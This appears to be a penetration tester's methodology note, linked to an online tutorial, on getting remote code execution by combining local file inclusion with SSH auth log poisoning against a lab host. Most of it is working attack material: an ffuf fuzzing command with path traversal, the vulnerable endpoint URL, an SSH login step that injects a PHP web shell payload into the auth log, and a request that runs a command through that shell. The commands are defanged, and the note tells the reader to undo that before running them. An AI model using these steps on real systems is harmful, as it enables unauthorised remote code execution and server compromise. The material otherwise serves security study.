<https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/>

> [!NOTE] Windows Defender Antivirus (AV) triggers on `.md` (Markdown) files, often flagging them as potential threats. As a result, the commands provided below have been defanged to avoid false positives. Kindly remove the brackets `[]` or `_` before executing them.
### Fuzzing application for LFI vulnerability testing 
ffuf -c -u 'hxxp[://]192[.]168[.]1[.]136/sea[.]p_h_p?file=../../../../../../FUZZ' \ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix[.]txt \ -b 'PHPSESSID=russhgsf2b2asdt3rm4jr4o50l' \ -fl 21
### Vulnerable endpoint identified
hxxp[://]192[.]168[.]1[.]136/sea[.]p_h_p?file=../../../../../var/log/auth
### Log poisoning technique (SSH auth log injection)
ssh 'DEFANGED_PAYLOAD_REMOVED'@192[.]168[.]1[.]136 
### Original payload:
<?p_h_p  system($_REQUEST['c_m_d']); ?>

hxxp[://]192[.]168[.]1[.]136/sea[.]p_h_p?file=../../../../../var/log/auth&cmd=id

![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/SSH and LFI log poisoning/{{notename}}-202605011506.png]]

![unnamed_07dbcb572988475ba7511fda80a99e7f](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/LFI_RFi/SSH%20and%20LFI%20log%20poisoning/{{notename}}-202605011506-2.png)

![[docs/Attachments/Methodology/1. Enumeration/0. Initial Recon/4. Common Web Attack Techniques/LFI_RFi/SSH and LFI log poisoning/{{notename}}-202605011506-1.png]]

![unnamed_4f8ac1aed9ce447281639a9919c67cb2](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/LFI_RFi/SSH%20and%20LFI%20log%20poisoning/{{notename}}-202605011507.png)